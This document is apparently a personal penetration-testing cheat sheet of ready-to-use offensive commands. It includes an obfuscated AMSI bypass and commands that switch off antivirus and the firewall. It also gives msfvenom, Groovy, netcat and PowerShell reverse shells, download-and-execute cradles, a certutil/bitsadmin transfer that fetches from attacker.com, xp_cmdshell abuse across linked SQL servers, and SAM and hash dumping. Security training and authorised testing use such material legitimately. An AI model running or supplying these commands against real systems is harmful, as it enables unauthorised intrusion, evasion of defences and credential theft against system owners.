## Bypass AV
```
# allow powershell scripts
powershell -ep bypass

# ASMI bypass
powershell sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Disable AV
set-mppreference -DisableRealTimeMonitoring $true -Force

# Disable firewall
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```
https://amsi.fail/

## Reverse Shells
### Listening port
> port 1234, 4444
```
nc -lvnp 4444
rlwrap nc -lvnp 4444

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
```
> rlwrap allows users to use previous commands 

### Msfvenom
>Take note, meterpreter is for msfconsole multihandler
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=4444 -f exe > reverse.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=4444 -f dll > reverse.dll
msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT=4444 -f exe > reverse.exe
msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT=4444 -f dll > reverse.dll
```
> windows .exe & .dll

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.0.1 LPORT=4444 -f elf >reverse.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.0.1 LPORT=4444 -f elf >reverse.elf
```
> linux

### Nishang 
```
import-module Invoke-PowerShellTcp.ps1
Invoke-PowerShellTcp -Reverse -IPAddress {LHOST} -Port 4444
```

### Jenkins Groovy
```
String host="10.10.14.119";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
> - /bin/bash for linux
> - cmd.exe for windows

### NetCat
```
#Host:
.\nv64.exe -lvnp {PORT}

#Target:
nc {host IP} {port}
```

### One liner
```
$client = New-Object System.Net.Sockets.TCPClient('{IP ADDRESS}',{PORT NUMBER});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
```

## Interactive Shells 
for reverse shells
```
# python 
python3 -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'

# perl 
exec "/bin/bash";

# ruby
exec "/bin/bash"

# lua
os.execute('/bin/bash')

# using netcat
rlwrap nc -vlnp 1234
```

## Server Hosting
### HTTP server
```
python3 -m http.server 80
```
> make sure to be in the directory of the server
> --directory can be used

### SMB
```
# Run server
sudo smbserver {share name} -username user -password password

# Windows
net use \\{IP}\{share name} /user:user password
get-smbshare
\\{ip}\{share name} in file explorer


# Linux
smbclient 
smbclient  -L //{IP}
smbclient  //{IP}/{Share name}
smbmap -u '{username}' -p '{password}' -H {IP}

# Usage
get > download {filename}
get > uppload {filename}
```

## Download
### Windows
```
wget {URL}
certutil.exe -urlcache -split -f http://{URL} {NAME}.exe
iwr http://{URL} -outfile {NAME}.exe
powershell.exe IEX (New-Object Net.WebClient).DownloadFile("{URL}")
```
#### Download and Execute
```
powershell.exe IEX (New-Object Net.WebClient).DownloadString("{URL}")
IEX((New-Object Net.WebClient).DownloadString("{URL}"))
powershell.exe -e {ENCODING}
```
https://raikia.com/tool-powershell-encoder/
https://amsi.fail/

#### Transfer files
```
# on attacker machine
certutil -encode beacon64.exe file.txt

# on victim
bitsadmin /Transfer myJob http://attacker.com/file.txt C:\windows\tasks\enc.txt && certutil -decode C:\windows\tasks\enc.txt C:\windows\tasks\cisa.exe && del C:\windows\tasks\enc.txt
```

### Linux
```
wget {URL}
curl -o {URL}
curl {URL} > {Dst Directory + Name}
```

## Check OS version
```
# Windows
[Environment]::Is64BitProcess
(Get-WmiObject Win32_OperatingSystem).OSArchitecture
systeminfo

# Linux
cat /proc/version
cat /proc/sys/kernel/osrelease
cat /proc/sys/kernel/ostype
cat /proc/sys/kernel/version
cat /etc/*release
hostnamectl
```

## Impacket
```
#Hash dump
secretsdump.py '{username}@{IP}'
```

## Dipsplay wifi password
```
netsh wlan show porfile
netsh wlan show porfile {WIFI NAME} key=clear
```

## SQL
### MYSQL
#### Usage
```
mysql -u {usernmae} -p {password} -h {IP}
```
#### MySQL commands
```
# show all databases
show databases;

# select a database
USE {database};

# display contents of the database
SHOW TABLES;

# display the speicfic content from the tables
describe {table};
SHOW COLUMNS FROM {table};

# displaying contents
SELECT {from the field} FROM {table};
SELECT * FROM {table};

e.g., 
USE users
SHOW TABLES
SHOW COLUMNS FROM users
SELECT name,value FROM users;

https://codingbee.net/rhce/mariadb-navigating-your-way-around-a-mysql-database

# Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
```
#### MySQL Bypass Authentication
```
```
#### MySQL injection
```
```
### MSSQL
#### PowerUpSQL
```
# Find domain accounts that have SQL access
Get-SQLInstanceDomain

# Check availability / Access
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose

# Gather Information e.g., which SQL serivce the user has access to
Get-SQLInstanceDomain | Get-SQLServerInfo -verbose

# Find links between serverrs
Get-SQLServerLink -Instance {server} -Verbose

# Enmuerating Database links
Get-SQLServerLinkCrawl Instance {server} -verbose
Get-SQLServerLinkCrawl -Instance '{computer}' -Query 'select @@version' | select Instance, CustomQuery | % { $_ | Add-Member NoteProperty 'QueryResult' $($_.CustomQuery[0]); $_ } | fl

# Executing commands
Get-SQLServerLinkCrawl -Instance {computer} -Query "exec master..xp_cmdshell 'whoami'" 
```
#### Queries
```
# useful commands
SELECT @@version
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'
EXEC xp_cmdshell 'dir C:\

# Enable xp_cmdshell
sp_configure 'Show Advanced Options', 1; RECONFIGURE;
sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Discover linked databases
SELECT * FROM master..sysservers

# Executing commands / queires on linked databases
EXEC('xp_cmdshell "dir C:\"') AT [{linked database}]
SELECT * FROM OPENQUERY("{linked database}", 'select @@servername; exec xp_cmdshell ''whoami''')

# Search for specific keywords in the database and format results in a table
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ? { $_.Status -eq 'Accessible' } | Get-SQLColumnSampleDataThreaded -SampleSize 5 -Keywords 'student,name' -NoDefaults | select instance, database, column, sample | ft -autosize
```

## Networking
```
# Windows
netstat 
netstat -an 
ipconfig {ip}
tracert {ip}

# Linux
ifconfig
ip a
```

## cmd
```
# SAM file dump
reg.exe save hklm\sam c:\temp\sam.save
reg.exe save hklm\security c:\temp\security.save
reg.exe save hklm\system c:\temp\system.save
```
